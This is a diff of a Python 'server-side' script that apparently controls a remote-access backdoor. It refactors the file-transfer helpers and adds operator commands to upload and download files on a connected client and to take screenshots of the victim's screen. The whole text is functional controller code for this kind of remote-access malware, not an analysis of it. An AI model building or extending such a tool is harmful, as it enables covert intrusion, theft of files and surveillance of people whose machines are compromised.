@@ -1,28 +1,12 @@
+#!/usr/bin/python3
+
+# server-side
+
 # modules
 
 import socket
 import os
-
-# definitions
-
-
-def download(file):
-    with open(file, 'wb') as f:
-        while True:
-            chunk = client.recv(1024)
-            if not chunk:
-                break
-            f.write(chunk)
-
-
-def upload(file):
-    with open(file, 'rb') as f:
-        while True:
-            chunk = f.read(1024)
-            if not chunk:
-                break
-            client.sendall(chunk)
-
+from definitions import *
 
 # main program
 
@@ -44,12 +28,16 @@ while True:
         break
     elif comm[:3] == 'cd ':
         client.send(comm.encode())
+    elif comm[:7] == 'upload ':
+        file = comm[7:]
+        upload(client, file)
+    elif comm[:9] == 'download ':
+        file = comm[9:]
+        download(client, file)
+    elif comm == 'screenshot':
+        screenshot_server(client)
     elif comm == 'clean':
         os.system(comm)
-    elif comm[:7] == 'upload ':
-        upload(comm[7:])
-    elif comm[:9] == 'download ':
-        download(comm[9:])
     elif comm.strip() == '':
         pass
     else:
